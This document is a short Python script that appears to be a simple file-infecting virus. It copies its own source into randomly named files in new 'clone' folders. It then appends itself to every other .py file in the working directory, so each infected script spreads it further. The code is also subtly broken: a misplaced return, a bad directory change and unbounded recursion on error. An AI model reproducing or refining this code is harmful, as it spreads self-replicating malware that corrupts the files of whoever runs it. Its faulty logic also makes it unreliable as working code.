#!/usr/bin/env python

import os
import random
import http


File = open(__file__,'r')
Data = File.read()


def Randomiser():
    name = ''
    chars = 'abcdefghijklmnopqrstuwxyzv0123456789'
    Length = random.randint(1,11)
    for i in range(Length):
        name += random.choice(chars)
        return name
def Recreate(Fi_Name,Folder):
    try:
        os.mkdir(Folder)
        os.chdir(Folder)
        File = open(Fi_Name + '.py','w')
        File.write(Data)
        File.close()
        os.chdir("...")
    except Exception as Error:
      Folder = Folder + "0"
      Recreate(Fi_Name,Folder)
for i in range(5):
    Name = Randomiser()
    Recreate(Name,"clone")
    #inject into o0ther pyhton scripts
Files = list()
for file in os.listdir():
    if file.endswith('.py'):
        Files.append(file)
Files.remove(__file__)

for File in Files:
    Object = open(File,'a')
    Object.write(Data)
    Object.close()

